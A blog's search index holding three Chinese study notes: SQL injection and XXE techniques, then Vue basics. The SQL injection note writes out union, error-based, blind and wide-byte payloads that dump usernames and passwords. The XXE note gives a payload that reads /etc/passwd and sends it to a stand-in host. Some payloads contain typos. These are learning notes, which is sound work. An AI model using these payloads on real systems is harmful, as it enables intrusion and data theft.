<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>SQL注入学习笔记</title>
    <url>/2024/06/02/SQL%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
SQL注入当客户端提交的数据未作处理或转义，直接带入数据库
具体来说，当Web应用程序对用户输入数据的合理性没有进行判断时，前端传入后端的参数就可能被攻击者所控制，并且根据这些参数带入数据库查询。攻击者可以通过构造不同的SQL语句来对数据库进行任意查询、增加、删除或修改等操作——-&gt;(通过构造一条精巧的语句来查询想要得到的信息 )

分类
按照查询字段
字符型：当输入的参数为字符串时，称为字符型
数字型：当输入的参数为整形时，可以认为是数字型注入


按照注入方法
Union注入(联合注入)
报错注入
布尔注入
时间注入



注入点是可以实行注入的地方，通常是一个访问数据库的连接 
比如
http://2.0.0.1/sql/Less-1/index.php?id= //id这个地方就是一个注入点

判断字符型注入和数字型注入数字型一般提交内容为数字，但是数字不一定为数字型
1.使用and 1&#x3D;1 和 and 1&#x3D;2来判断

如果提交and 1&#x3D;1 和 and 1&#x3D;2都能正常显示界面，则为字符型注入，原因是输入的东西相当于被引号括起来了，and就不是 指令(字符型需要闭合符’’来提交)
如果提交and 1&#x3D;1能正常显示，提交and 1&#x3D;2不能正常显示，则为数字型

2.可以使用 2-1判断
http://2.0.0.1/sql/Less-1/index.php?id= 2-1//数字型：会查找id=1的值//字符型：不能运算，仍然显示原来的结果

ps：为什么不用+？+有的时候会被理解为空格
闭合方式‘ , “ , ‘) , “)

闭合的作用手动提交闭合符号，结束前一段查询语句
后面即可加入其他语句，查询需要的参数
不需要的语句可以用注释符号’–+’或’#’或’%23’注释掉
Union联合注入注意：联合查询必须要求列数一致，否则报错
查询回显位：查询回显位通常指的是在执行查询操作后，确定查询结果在页面上的哪个位置显示出来。这通常与网页开发、数据库查询以及命令行界面操作相关。
步骤​	0.查找注入点

先判断字符型注入还是数字型注入，如果是字符型，找到它的闭合方式
 /*1.字符型：要自己加一个闭合符提前结束闭合，不然group by语句被闭合就失效了 ?id=1&#x27; group by 10 --+2.数字型：直接group by----用order by也可以-----*/


二分法判断列数（group by&#x2F;order by），比如先group by 10 再group by 5这样

根据列数进行union查询
 -- 比如得到列数是3字符型?id=1&#x27; union select 1,2,3 --+-- 如果想看到联合查询查出来的东西，那么需要让前面为假（可以让id等于一个没有的值）

查询回显位置


拿到表名!!!数据库information_schema

 
-- 比如对于Less-1(字符型)...../index.php?id=0&#x27; union select 1,table_name,3 from information_schema.tables where table_schema=database() --+ 加上where限定是回显位显示的更准确，直接等于database()能更好绕过防火墙

即使加上了where限定，但是对于多个属于同一个库的表，还是会出现回显位只能显示第一个表的情况。这时需要group_concat()
/index.php?id=0&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where schema.table_scema=database() --+  就能显示属于当前库所有表

拿到列名与前面类似
/index.php?id=0&#x27; union select 1,column_name,3 from information_schema.columns where table_shcema=database() and table_name = &#x27;users&#x27; --+ 

可以获取到表名为users，列名id，username，password，然后就可以获取全部信息了
字符型：/index.php id=-1&#x27; union select 1,group_concat(username,password),3 from user --+

group_concat()之间可以自己加入分隔符加强可读性
数字型union注入与字符型的区别：不用判断闭合方式
报错注入

报错注入：构造语句，让错误信息中夹杂可以显示数据库内容的查询语句
extractvalue注入select extractvalue(列名（XML文档对象名称）,路径) from 表名;-- 注入的时候不考虑列到底存不存在

如何让它报错1.如果只是写错路径下的名字，不会报错，只是找不到
2.路径格式错误，报错，会把错的路径报出来
​	构造思路：既然错的路径会被报出来，能不能利用这一点，在报错这个地方报错之前先回显一些有用的信息
select extractvalue(列名,concat(0x7e,(select database())) from 表名;-- 0x7e是~的ASCII值，使路径错误引起报错                   

index.php?id=1 union select 1,2,extractvalue(1,concat(0x7e,(concat(select database()))))-- 路径错误引起报错，可以回显当前数据库的名字-- 也可以这么写index.php?id=1 and 1=extractvalue(1,concat(0x7e,(concat(select database()))))

如何获得不同的信息在concat的第二个参数动手脚
获取表名
index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))

获取列名
index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;)))

获取详细信息
index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select group_by(id,username,password) from 想查的表名)))

ps:报错的回显位最多只能显示32个字符，可以用substring解决这个问题

index.php?id=1 and 1=extractvalue(1,concat(0x7e,(select substring(group_by(id,username,password),30,30) from 想查的表名)))-- 从第30个字符再往后显示30个字符

updatexml注入
原理与extractvalue()一样，在第二个参数-xml路径上动手脚，参数用法也和extractvalue()一样

floor报错




报错原理

分析rand()中传入0后，floor(rand(0)*2)随机出的字符串为01101，rand()函数进行分组group by和统计count()时可能会多次执行，导致键值key重复

第一次统计时，group_key里面没有security-0这个键值，concat_ws()要重新计算一个键值给它（指group_key），计算的结果就是0下一位security-1，加入group_key中，进行统计；第二次统计时，键值存在，其实算的是第三位的security-1，键值存在，count（）++；再下一位，遇到security-0，键值不存在，重新计算到下一位security-1，加入group_key中，但是原本已经有security-1这个键值了，发生键值冲突，报错
select count(*),concat_ws(&#x27;-&#x27;,(database()),floor(rand(0)*2)) as a from 表名 group by a;/*这里的from 表名 是为了让rand（）产生足够多次数的计算，一般使用行数较多的默认数据表，比如information_schema.tables*/



盲注
布尔盲注web页面只返回true真和false假 两种类型，利用页面返回不同，逐个猜解数据




但是ascii()并不能对字符串中的每个字符都求得ascii值，只能显示第一个字符的ascii码值，所以需要substr(str,n,k)&#x2F;substring(str,n,k)来辅助(从第n个字符开始显示k个字符)
index.php?id=1 and substr((&#x27;abcd&#x27;),1,1) //把abcd换成想要的语句


时间盲注


-- 可以根据页面响应时间判断字符型-闭合方式/数字型


-- exampleselect if(acsii(substr((select database()),1,1))&gt;=97,sleep(10),sleep(0))



宽字节注入

局限性：宽字节注入必须使用GBKB编码
意思就是%5c()原本应该和后面的单引号结合，但是却被解析成和前面自己输入进去的一个字符结合，使得\失去自己的作用

http://192.168.127.186/sql/Less-32/index.php?id=-1%df&#x27; union select 1,group_concat(username,id,password),3 from users --+



注入文件上传mysql文件上传要点show variables like &#x27;%secure%&#x27;; -- 来查看MySQL是否有读写文件权限，如果secure_file_priv的值是空的，那么MySQL可以在任何位置读取和写入文件（这通常是不安全的）。如果它被设置为一个目录的路径，那么MySQL只能在该目录内读取和写入文件into outfile 命令的使用环境:必须知道一个，服务器上可以写入文件的文件夹的完整路径

步骤
还是先判断字符型和数字型
如果是字符型，再判断闭合方式 加上and 1&#x3D;2 和and 1&#x3D;1判断闭合符是否正确
然后判断列数

]]></content>
      <categories>
        <category>Web安全</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>Web安全 - SQL注入 - PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE学习笔记</title>
    <url>/2024/09/11/XML%20&amp;&amp;%20XXE/</url>
    <content><![CDATA[前言本文是初学web安全时写的，有许多地方不够严谨，逻辑上也存在问题，请见谅~
XML与HTML的不同与html区别：html表示与数据相关，XML更多用于数据传输、存储
XML结构
&lt;?xml version=&quot;1.0&quot;?&gt;表示版本号，xml处理解析时的规范&lt;Person&gt;...&lt;/Person&gt;表示根元素，XML文档需有且仅有一个根元素根元素内有两个赋值的嵌套标签子元素&lt;Name&gt;&lt;/Name&gt;,&lt;Age&gt;&lt;/Age&gt;

注意：元素标签名对大小写敏感

上述单独字符不能直接出现，会被错误解析
实体（ENTITIY）ENTITY就像XML中的变量，可以对其进行赋值，在XML文档的其他地方进行引用，实体在XML的文档类型定义部分（DTD）被单独定义描述
XML 文档的根元素通常与 DTD 中定义的根元素名称相匹配
 
&lt;!DOCTYPE Person [	&lt;!ENTITY name &quot;XXX&quot;&gt;]&gt;&lt;Person&gt;    &lt;Name&gt;&amp;name;&lt;/Name&gt;    &lt;Age&gt;20&lt;/Age&gt;&lt;/Person&gt;前面的DOCTYPE表示这是一个DTD，用ENTITTY定义了一个叫做name的实体，赋值为XXX;后面可以直接用&amp;跟上实体名引用这个实体，可以防止重复赋值



DTD分类DTD并不是XML文档的一部分，它们总是在根元素的定义之上-&gt;DTD像实体一样可以从外部加载

一般实体&#x2F;通用实体（general entities）
  如上面的那个实体
  引用外部dtd：
  解析器将从这个外部dtd中提取并解析内容
  &lt;!DOCTYPE Pwn SYSTEM &quot;xxx.dtd&quot;&gt; dtd的URI&lt;Pwn&gt;test&lt;/Pwn&gt; 是 XML 文档的根元素，它的名字与 DOCTYPE 声明中的名称相匹配。这意味着 Pwn 是这个 XML 文档的根元素，它包含的文本是 test。


参数实体
  必须定义在单独的dtd区域内，参数实体只能在同一个DTD中调用
  比如，用一个实体给另外一个实体赋值
  &lt;!ENTITY % outer &lt;!ENTITY inner  &quot;xxx&quot;&gt;&gt;

  ​	常用于XXE（外部实体注入）
  dtd中调用参数实体
  参数实体只能在同一个DTD中调用！！！
  &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE Pwn[	&lt;!ENTITY % outer &quot;&lt;!ENTITY inner SYSTEM &#x27;xxx&#x27;&gt;&quot;&gt;	%outer;]&gt;&lt;Pwn&gt;&amp;inner;&lt;/Pwn&gt;

  
  XML调用DTD中实体参数的大概流程：XML解释器发现这段代码时，先检查版本；然后发现dtd，这个dtd在xml文档中，可以叫做内联dtd，%开头的是参数实体标志，%outer的值是inner中解析出的东西；调用被赋值的%outer相当于

预定义实体
  某些特殊符号的一组预定义数值集，这些特殊符号有可能会破坏XML结构（报错），可以选择用其他形式比如十六进制表示这类符号
  &lt;test&gt;&amp;#x3C;&lt;/test&gt; 这一串十六进制表示了&lt;

XML安全性问题
ENTITY  实体可以被赋值（存储数据），但是实体功能不止这个，外部实体就是其中一个功能。
  实体不仅能用来存储指定数值，还可以从本地文件或远程网络中调取相关数据，作为后续实体引用，但是这样带来了广泛的攻击面
  比如：
  &lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE XXE[&lt;!ENTITY subcribe SYSTEM &quot;secret.txt&quot;&gt;]&gt;&lt;pwn&gt;&amp;subscribe;&lt;/pwn&gt;

  SYSTEM表示后面的内容是外部实体；
  如果外部实体长得是标签或者和XML很像的东西，XML解析器会报错；
  这样的实体赋值并不是secret.txt，而是其中的内容，XML在此接收任意有效的URI包括文件，HTTP，ftp和其他协议形式的内容
  外部实体读取了数据，这种就是外部实体注入攻击（XXE）
外部实体注入攻击（XXE）分类带内数据  上面的示例涉及的就是带内XXE；
  XML解析后的输出会直接显示在屏幕上
基于错误  解析结果只有错误信息（类似Blind XXE）
带外数据  OOB；真正的盲注，XML解析后无任何输出响应（无回显），必须执行一些带外请求把目标数据提取出来
  场景：
  
  有一个能解析XML但是没有任何输出响应的web应用，为了测试这种盲注XXE，我们可以用非文件路径的外部实体来请求这里的web应用，可以用dns平台监听web应用是否解析了XML，也可以用自己构造好的网站（SYSTEM后的外部实体URL为测试的地方）



如果监听到了，就说明XML被成功解析，目标web应用正在尝试获取我们构造的网站上的资源作为外部实体，这样我们可以利用受害者的身份发起请求（服务器端请求伪造（SSRF））
Payloadeg：

&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE XXE[&lt;!ENTINY %passwd SYSTEM &quot;/etc/passwd&quot;&gt;&lt;!ENTINY %wrapper &quot;&lt;!ENTINY send SYSTEM &#x27;http://xxx.com/?passwd;&#x27;&gt;&quot;&gt;%wrapper;]&gt;&lt;pwn&gt;send;&lt;/pwn&gt;XML解释器会先解析/etc/passwd的内容赋值到参数实体%passwd中，然后解析URL中的内容赋给实体send，send再赋给参数实体%wrapper但是这样会报错，根据xml规范， dtd内部子集的参数实体调用不能在实际的标记语言（html，svg等）中来调用参数实体，但是可以在同级别中被当作标记语言调用，外部参数实体不受此限制，可以借助外部dtd绕过这个限制


比如payload形式为：
&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE data SYSTEM &quot;/xxx/xx/x/test.dtd&quot;&gt;;&lt;data&gt;&amp;send;&lt;/data&gt; 莫名冒出来的send实体就来自外部的dtd



%passwd最终会变成URL的一部分

]]></content>
      <categories>
        <category>Web安全</category>
        <category>XXE &amp;&amp; XML</category>
      </categories>
      <tags>
        <tag>Web安全 - XXE &amp;&amp; XML</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue学习笔记</title>
    <url>/2025/03/05/Vue/</url>
    <content><![CDATA[前期准备下载node.js,安装VueCLI
npm install -g @vue/cli #-g 全局安装vue --version

创建项目
vue create 项目名 #项目名中不能有大写字母，可以有小写字母和-


项目结构
在src下编写代码，其他是配置文件
src&#x2F;assets:存放静态文件（公共CSS文件，图片）
src&#x2F;components：公共组件
App.vue：根组件
main.js:主入口文件
模板语法
&lt;template&gt;  &lt;div class=&quot;hello&quot;&gt;    &lt;h3&gt;学习模板语法&lt;/h3&gt;  &lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;  name: &#x27;HelloWorld&#x27;,  props: &#123;    msg: String  &#125;&#125;&lt;/script&gt;&lt;!-- &lt;template&gt;中是HTML，&lt;script&gt;中是业务逻辑--&gt;

数据绑定
双大括号搭配js中的data()函数,data()返回一个对象型数据
&lt;template&gt;	&lt;div class=&quot;hello&quot;&gt;		&lt;h3&gt;学习模板语法&lt;/h3&gt;		&lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;	&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;	name: &#x27;HelloWorld&#x27;,	data()&#123;		return&#123;			message:&#x27;study&#x27;		&#125;	&#125;&#125;&lt;/script&gt;

结果：

原始HTML
{{}}与v-html区别就好比document.getElementById().innerHTML和document.getElementById().innerText的区别

&lt;template&gt;	&lt;div class=&quot;hello&quot;&gt;		&lt;h3&gt;学习模板语法&lt;/h3&gt;		&lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;		&lt;span&gt;&#123;&#123; rawHtml &#125;&#125;&lt;/span&gt;		&lt;p&gt;v&lt;span v-html=&quot;rawHtml&quot;&gt;&lt;/span&gt;&lt;/p&gt;	&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;	name: &#x27;HelloWorld&#x27;,	data()&#123;		return&#123;			message:&#x27;study&#x27;,			rawHtml:&#x27;&lt;a href=&quot;https://www.bilibili.com&quot;&gt;bilibili&lt;/a&gt;&#x27;		&#125;	&#125;&#125;&lt;/script&gt;


属性Attribute
&lt;template&gt;	&lt;div class=&quot;hello&quot;&gt;		&lt;h3&gt;学习模板语法&lt;/h3&gt;		&lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;		&lt;span&gt;&#123;&#123; rawHtml &#125;&#125;&lt;/span&gt;		&lt;p&gt;v&lt;span v-html=&quot;rawHtml&quot;&gt;&lt;/span&gt;&lt;/p&gt;		&lt;span v-bind:id=&quot;Id&quot;&gt;&lt;/span&gt;        &lt;span :id=&quot;Id&quot;&gt;&lt;/span&gt;	&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;	name: &#x27;HelloWorld&#x27;,	data()&#123;		return&#123;			message:&#x27;study&#x27;,			rawHtml:&#x27;&lt;a href=&quot;https://www.bilibili.com&quot;&gt;bilibili&lt;/a&gt;&#x27;,			Id:114514		&#125;	&#125;&#125;&lt;/script&gt;

使用JavaScript表达式

&lt;template&gt;	&lt;div class=&quot;hello&quot;&gt;		&lt;h3&gt;学习模板语法&lt;/h3&gt;		&lt;span&gt;&#123;&#123; message &#125;&#125;&lt;/span&gt;		&lt;span&gt;&#123;&#123; rawHtml &#125;&#125;&lt;/span&gt;		&lt;p&gt;v&lt;span v-html=&quot;rawHtml&quot;&gt;&lt;/span&gt;&lt;/p&gt;		&lt;span v-bind:id=&quot;Id&quot;&gt;&lt;/span&gt;		&lt;span&gt;&#123;&#123; flag?&quot;123&quot;:&quot;456&quot; &#125;&#125;&lt;/span&gt;		&lt;br&gt;		&lt;span&gt;&#123;&#123; num+10 &#125;&#125;&lt;/span&gt;	&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;	name: &#x27;HelloWorld&#x27;,	data()&#123;		return&#123;			message:&#x27;study&#x27;,			rawHtml:&#x27;&lt;a href=&quot;https://www.bilibili.com&quot;&gt;bilibili&lt;/a&gt;&#x27;,			Id:114514,			flag:true,			num:20		&#125;	&#125;&#125;&lt;/script&gt;

不能在双括号里++ – +&#x3D;，会引发无限递归，在 Vue 的模板中，每次渲染时都会执行这个表达式，导致 num 的值不断递增

条件渲染v-if
&lt;template&gt;	&lt;div v-if=&quot;flag&quot;&gt;你好&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;	data()&#123;		return&#123;			flag:true		&#125;	&#125;&#125;&lt;/script&gt;

v-else
&lt;template&gt;	&lt;div v-if=&quot;!flag&quot;&gt;你好&lt;/div&gt;	&lt;div v-else&gt;不好&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;	data()&#123;		return&#123;			flag:true		&#125;	&#125;&#125;&lt;/script&gt;

v-show
&lt;template&gt;	&lt;div v-if=&quot;!flag&quot;&gt;你好&lt;/div&gt;	&lt;div v-else&gt;不好&lt;/div&gt;	&lt;div v-show=&quot;flag&quot;&gt;芜湖&lt;/div&gt;	&lt;div v-show=&quot;!flag&quot;&gt;不芜湖&lt;/div&gt;&lt;/template&gt;&lt;script&gt;export default &#123;	data()&#123;		return&#123;			flag:true		&#125;	&#125;&#125;&lt;/script&gt;


即使!flag为false，不芜湖这句依然存在，只是css样式被替换
列表渲染
&lt;template&gt;        &lt;li v-for=&quot;item in List&quot;&gt;                &#123;&#123; item.message &#125;&#125;        &lt;/li&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        List:[                                &#123;message:&quot;1&quot;&#125;,                                &#123;message:&quot;2&quot;&#125;,                                &#123;message:&quot;3&quot;&#125;                        ]                &#125;        &#125;&#125;&lt;/script&gt;


维护状态
就地更新指的是
&lt;!--原来--&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        List:[                                &#123;message:&quot;1&quot;&#125;,                                &#123;message:&quot;2&quot;&#125;,                                &#123;message:&quot;3&quot;&#125;                        ]                &#125;        &#125;&#125;&lt;/script&gt;&lt;!--发生更改--&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        List:[                                &#123;message:&quot;1&quot;&#125;,                                &#123;message:&quot;2&quot;&#125;,                                &#123;message:&quot;3&quot;&#125;,                            	&#123;message:&quot;4&quot;&#125;//只会重新渲染这一条新的                        ]                &#125;        &#125;&#125;&lt;/script&gt;

增加v-bind:key属性
&lt;template&gt;        &lt;li v-for=&quot;item in List&quot; :key=&quot;item.id&quot;&gt;                &#123;&#123; item.message &#125;&#125;        &lt;/li&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        List:[                                &#123;id:1,message:&quot;1&quot;&#125;,                                &#123;id:2,message:&quot;2&quot;&#125;,                                &#123;id:3,message:&quot;33&quot;&#125;,                                &#123;id:4,message:&quot;4&quot;&#125;                        ]                &#125;        &#125;&#125;&lt;/script&gt;

如果数组中元素没有id怎么办，v-for遍历时其实有一个索引index，将index作为key
&lt;template&gt;        &lt;li v-for=&quot;(item,index) in List&quot; :key=&quot;index&quot;&gt;                &#123;&#123; item.message &#125;&#125;        &lt;/li&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        List:[                                &#123;id:1,message:&quot;1&quot;&#125;,                                &#123;id:2,message:&quot;2&quot;&#125;,                                &#123;id:3,message:&quot;33&quot;&#125;,                                &#123;id:4,message:&quot;4&quot;&#125;                        ]                &#125;        &#125;&#125;&lt;/script&gt;

事件处理监听事件
v-on缩写为@
&lt;template&gt;        &lt;button @click=&quot;count+=1&quot;&gt;&#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        count:0                &#125;        &#125;&#125;&lt;/script&gt;

事件处理方法
&lt;template&gt;        &lt;button @click=&quot;clickEvent&quot;&gt;&#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        count:0                &#125;        &#125;,        methods:&#123;                clickEvent()&#123;                        this.count+=1;//在事件中读取data的属性需要用this.属性                &#125;        &#125;&#125;&lt;/script&gt;

&lt;template&gt;        &lt;button @click=&quot;clickEvent&quot;&gt;&#123;&#123; message &#125;&#125;&lt;/button&gt;        &lt;button @click=&quot;Increment&quot;&gt;count = &#123;&#123; count &#125;&#125;&lt;/button&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data() &#123;                return &#123;                        count: 0,                        message: &quot;通知消息&quot;                &#125;        &#125;,        methods: &#123;                clickEvent(event) &#123;                        event.target.innerHTML = &quot;点击了通知消息&quot;;//对原生dom事件处理                &#125;,                Increment() &#123;                        this.count += 1;                &#125;        &#125;&#125;&lt;/script&gt;

点击前：

点击两个按钮后：

内联处理器中的方法&#x2F;事件传递参数
&lt;!--实现效果：点击列表元素时弹窗内容是列表元素--&gt;&lt;template&gt;        &lt;li @click=&quot;ItemHandle(item)&quot; v-for=&quot;(item,index) in List&quot; :key=&quot;index&quot;&gt;                &#123;&#123; item &#125;&#125;        &lt;/li&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data() &#123;                return &#123;                        count: 0,                        message: &quot;通知消息&quot;,                        List:[                                &#x27;111&#x27;,&#x27;222&#x27;,&#x27;333&#x27;                        ]                &#125;        &#125;,        methods: &#123;                ItemHandle(item)&#123;                        alert(item);                &#125;        &#125;&#125;&lt;/script&gt;

表单输入绑定
&lt;template&gt;        &lt;input v-model=&quot;username&quot;&gt;        &lt;p&gt;&#123;&#123; username &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        username:&quot;&quot;                &#125;        &#125;&#125;&lt;/script&gt;

实现效果，p标签中的值根据表单输入数据实时更新
修饰符.lazy
&lt;template&gt;        &lt;input v-model.lazy=&quot;username&quot;&gt;        &lt;p&gt;&#123;&#123; username &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script&gt;export default &#123;        data()&#123;                return&#123;                        username:&quot;&quot;                &#125;        &#125;&#125;&lt;/script&gt;

回车之后才会同步更新，不会再一边输入一边同步
.trim
组件基础单文件组件
模板：html（必须存在），逻辑：js（看需求存在），样式：css（看需求存在
&lt;template&gt;&lt;/template&gt;&lt;script&gt;&lt;/script&gt;&lt;style&gt;&lt;/style&gt;

加载组件
&lt;!-- 在根组件中App.vue中:    引入组件：import 组件名 from &#x27;组件文件的路径&#x27;    挂在组件:在export default&#123;&#125;块中加入components:&#123;组件名&#125;    显示组件:template块中加上标签&lt;组件名/&gt;--&gt;&lt;!--MyComponent.vue--&gt;&lt;template&gt;        &lt;h3&gt;MyComponent&lt;/h3&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;//默认组件                name:&#x27;Mycomponent&#x27;//组件名        &#125;&lt;/script&gt;&lt;!-- scoped:样式只在当前样式中生效 --&gt;&lt;style scoped&gt;        h3&#123;                color: crimson;        &#125;&lt;/style&gt;&lt;!--App.vue--&gt;&lt;template&gt;  &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;  &lt;MyComponent/&gt;  &lt;my-component/&gt;&lt;!--也可以这样写，用-分开单词--&gt;&lt;/template&gt;&lt;script&gt;import MyComponent from &#x27;./components/MyComponent.vue&#x27;;export default &#123;  name: &#x27;App&#x27;,  components: &#123;    MyComponent  &#125;&#125;&lt;/script&gt;&lt;style&gt;#app &#123;  font-family: Avenir, Helvetica, Arial, sans-serif;  -webkit-font-smoothing: antialiased;  -moz-osx-font-smoothing: grayscale;  text-align: center;  color: #2c3e50;  margin-top: 60px;&#125;&lt;/style&gt;

效果:

组件的组织
Props组件交互
父组件怎么向子组件中传参？
&lt;!--传参--&gt;&lt;template&gt;        &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;        &lt;MyComponent :title=&quot;title&quot;/&gt;&lt;!--:key=&quot;value&quot;的形式--&gt;&lt;/template&gt;&lt;script&gt;import MyComponent from &#x27;./components/MyComponent.vue&#x27;;export default &#123;        name: &#x27;App&#x27;,        components: &#123;                MyComponent        &#125;,        data()&#123;                return &#123;                        title:&quot;props组件交互&quot;                &#125;        &#125;&#125;&lt;/script&gt;&lt;style&gt;#app &#123;        font-family: Avenir, Helvetica, Arial, sans-serif;        -webkit-font-smoothing: antialiased;        -moz-osx-font-smoothing: grayscale;        text-align: center;        color: #2c3e50;        margin-top: 60px;&#125;&lt;/style&gt;&lt;!--接收参数--&gt;&lt;template&gt;        &lt;h3&gt;props组件交互&lt;/h3&gt;        &lt;p&gt;&#123;&#123; title &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;                name:&#x27;MyComponent&#x27;,                props:&#123;//固定格式props:&#123;参数名:&#123;type:,default:&#125;&#125;                        title:&#123;                                type:String,                                default:&quot;null&quot;//默认值                        &#125;                &#125;        &#125;&lt;/script&gt;&lt;style scoped&gt;        h3&#123;                color: crimson;        &#125;        p&#123;                color:aquamarine;        &#125;&lt;/style&gt;


&lt;!-- 传递多个参数与数组 --&gt;&lt;template&gt;        &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;        &lt;MyComponent :title=&quot;name&quot; :age=&quot;age&quot; :List=&quot;List&quot;/&gt;&lt;/template&gt;&lt;script&gt;import MyComponent from &#x27;./components/MyComponent.vue&#x27;;export default &#123;        name: &#x27;App&#x27;,        components: &#123;                MyComponent        &#125;,        data()&#123;                return &#123;                        name:&quot;props&quot;,                        age:20,                        List:[&#x27;amy&#x27;,&#x27;bob&#x27;,&#x27;cindy&#x27;]                &#125;        &#125;&#125;&lt;/script&gt;&lt;style&gt;#app &#123;        font-family: Avenir, Helvetica, Arial, sans-serif;        -webkit-font-smoothing: antialiased;        -moz-osx-font-smoothing: grayscale;        text-align: center;        color: #2c3e50;        margin-top: 60px;&#125;&lt;/style&gt;&lt;!-- 接收多个参数与数组 --&gt;&lt;template&gt;        &lt;h3&gt;props组件交互&lt;/h3&gt;        &lt;p&gt;&#123;&#123; title &#125;&#125;&lt;/p&gt;        &lt;p&gt;age = &#123;&#123; age &#125;&#125;&lt;/p&gt;        &lt;p v-for=&quot;(item,index) in List&quot; :key=&quot;index&quot;&gt; &#123;&#123; item &#125;&#125; &lt;/p&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;                name:&#x27;MyComponent&#x27;,                props:&#123;                        title:&#123;                                type:String,                                default:&quot;null&quot;                        &#125;,                        age:&#123;                                type:Number,                                default:0                        &#125;,                        List:&#123;                                type:Array,                                //数组和对象必须以函数形式返回(工厂模式)                                default:function()&#123;                                        return [];                                &#125;                        &#125;                &#125;        &#125;&lt;/script&gt;&lt;style scoped&gt;        h3&#123;                color: crimson;        &#125;        p&#123;                color:aquamarine;        &#125;&lt;/style&gt;

自定义事件组件交互用$emit()
&lt;!-- 发送 --&gt;&lt;template&gt;        &lt;h3&gt;自定义事件组件交互&lt;/h3&gt;        &lt;button @click=&quot;SendMessage&quot;&gt;Click~&lt;/button&gt;&lt;/template&gt;&lt;script&gt;        export default&#123;                name:&#x27;MyComponent&#x27;,                data()&#123;                        return&#123;                                message:&#x27;这是一个信息&#x27;                        &#125;                &#125;,                methods:&#123;                        SendMessage()&#123;                                /*                                参数一:字符串,是自定义的事件名                                参数二:要传递的内容                                */                                this.$emit(&#x27;OnEvent&#x27;,this.message);                        &#125;                &#125;        &#125;&lt;/script&gt;&lt;style scoped&gt;        h3&#123;                color: crimson;        &#125;        p&#123;                color:aquamarine;        &#125;&lt;/style&gt;&lt;!-- 接收 --&gt;&lt;template&gt;        &lt;img alt=&quot;Vue logo&quot; src=&quot;./assets/logo.png&quot;&gt;        &lt;MyComponent @OnEvent=&quot;GetMessage&quot; /&gt;&lt;!--@自定义事件=&quot;处理的函数&quot;--&gt;        &lt;p&gt;&#123;&#123; Message &#125;&#125;&lt;/p&gt;&lt;/template&gt;&lt;script&gt;import MyComponent from &#x27;./components/MyComponent.vue&#x27;;export default &#123;        name: &#x27;App&#x27;,        components: &#123;                MyComponent        &#125;,        data()&#123;                return&#123;                        Message:&quot;&quot;                &#125;        &#125;,        methods: &#123;                GetMessage(Message) &#123;//Message就是自定义事件OnEvent传递过来的参数                        this.Message = Message                &#125;        &#125;&#125;&lt;/script&gt;&lt;style&gt;#app &#123;        font-family: Avenir, Helvetica, Arial, sans-serif;        -webkit-font-smoothing: antialiased;        -moz-osx-font-smoothing: grayscale;        text-align: center;        color: #2c3e50;        margin-top: 60px;&#125;&lt;/style&gt;

组件生命周期
示意图
#先执行以下命令npm init vue@latest#一路选nnpm install / cnpm inpm run dev

生命周期/*分为：创建期：beforeCreate created挂载期：beforeMount mounted更新期：beforeUpdate updated销毁期：beforeUnmount unmounted*/

钩子函数不能写在methods块中
